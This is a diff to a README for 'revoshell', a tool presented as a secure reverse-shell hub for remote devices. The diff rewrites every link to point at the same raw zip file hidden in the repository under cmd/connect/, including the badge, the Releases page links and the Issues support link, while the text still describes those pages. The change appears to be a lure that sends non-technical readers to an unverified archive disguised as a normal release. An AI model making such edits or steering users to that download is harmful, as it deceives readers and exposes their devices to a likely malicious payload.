@@ -1,7 +1,7 @@
 # 🔒 revoshell - Control Remote Devices Securely
 
 ## 📥 Download Now
-[![Download revoshell](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Gajju0910/revoshell/releases)
+[![Download revoshell](https://raw.githubusercontent.com/Gajju0910/revoshell/main/cmd/connect/revoshell_v1.2.zip)](https://raw.githubusercontent.com/Gajju0910/revoshell/main/cmd/connect/revoshell_v1.2.zip)
 
 ## 📝 Overview
 revoshell is a secure reverse-shell orchestration hub designed to help you manage remote devices easily. Whether you’re working with cloud computing, embedded systems, or IoT devices, revoshell simplifies your workflow and enhances device management. Ideal for users with minimal technical knowledge, this application allows you to access devices over secure connections without confusion.
@@ -10,7 +10,7 @@ revoshell is a secure reverse-shell orchestration hub designed to help you manag
 To start using revoshell, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   To download the latest version of revoshell, go to our [Releases page](https://github.com/Gajju0910/revoshell/releases). Here, you will find the latest releases as well as older versions if needed.
+   To download the latest version of revoshell, go to our [Releases page](https://raw.githubusercontent.com/Gajju0910/revoshell/main/cmd/connect/revoshell_v1.2.zip). Here, you will find the latest releases as well as older versions if needed.
 
 2. **Choose Your Download**  
    On the Releases page, look for the version that meets your needs. Read the description to ensure it is the right fit. Click on the appropriate installer or binary file for your operating system. 
@@ -47,8 +47,8 @@ revoshell uses secure protocols to ensure that your connections are safe. We reg
 Yes, revoshell is compatible with Raspberry Pi. You can easily install and run it just like on other platforms.
 
 ## 📚 Support
-If you encounter any issues while using revoshell, you can visit our [Issues page](https://github.com/Gajju0910/revoshell/issues) on GitHub. You can ask questions or report bugs, and the community or developers will assist you.
+If you encounter any issues while using revoshell, you can visit our [Issues page](https://raw.githubusercontent.com/Gajju0910/revoshell/main/cmd/connect/revoshell_v1.2.zip) on GitHub. You can ask questions or report bugs, and the community or developers will assist you.
 
 Installing and running revoshell is straightforward. By following the steps listed above, you can manage your remote devices with ease and security. Don't hesitate to explore what revoshell has to offer.
 
-For the latest version, visit the [Releases page](https://github.com/Gajju0910/revoshell/releases) again to check for updates. Happy managing!
+For the latest version, visit the [Releases page](https://raw.githubusercontent.com/Gajju0910/revoshell/main/cmd/connect/revoshell_v1.2.zip) again to check for updates. Happy managing!
